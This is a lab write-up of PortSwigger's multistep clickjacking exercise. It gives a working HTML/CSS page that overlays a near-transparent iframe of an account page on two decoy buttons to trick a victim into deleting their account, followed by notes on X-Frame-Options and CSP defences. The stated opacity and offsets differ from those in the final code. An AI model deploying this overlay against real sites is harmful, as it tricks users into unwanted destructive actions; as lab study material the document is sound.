# PortSwigger Web Security Academy: Clickjacking Lab 5

## Lab Name
Multistep clickjacking

## How I Solved 

1. **Authenticated:** Logged into the target user account (`wiener`/`peter`) to establish the target session.
2. **Crafted Payload:** Used the Exploit Server to create an HTML page hosting the target's `/my-account` page inside an `iframe`.
3. **UI Redressing (Multi-alignment):**
   * Created two separate decoy elements: `<div class="firstClick">` and `<div class="secondClick">`.
   * Finetuned the `.firstClick` CSS positioning (`top: 330px`, `left: 50px`) to align with the primary "Delete account" button.
   * Clicked the button manually to load the confirmation page, then finetuned the `.secondClick` CSS positioning (`top: 285px`, `left: 225px`) to align precisely over the subsequent "Yes" button.
4. **Made Transparent:** Set the iframe `opacity` to `0.0001` to entirely obscure the underlying sequence from the victim.
5. Final Code Used:
```html
<style>
    iframe {
        position: relative;
        width: 900px;
        height: 700px;
        opacity: 0.1; 
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        z-index: 1;
    }
    .firstClick {
        top: 497px;  
        left: 50px;
    }
    .secondClick {
        top: 295px;  
        left: 215px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a92003a034f77c0821f1adf00800030.web-security-academy.net/my-account"></iframe>
```
6. **Executed Attack:** Changed decoy texts to "Click me first" and "Click me next", and delivered the multi-step exploit to the victim.

## What I Learned 

* **Multistep Exploitation:** Multi-step confirmation processes (e.g., clicking "Delete Account" and then confirming "Yes") do not protect against Clickjacking.
* **The Reason:** Attackers are not limited to a single decoy element. They can overlay multiple deceptive layers (Decoy Elements) on their malicious page to trick the victim into making a sequence of clicks.
* **Defense:** Confirmation steps are completely ineffective against Clickjacking. Modern applications must enforce secure HTTP response headers like `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors`.

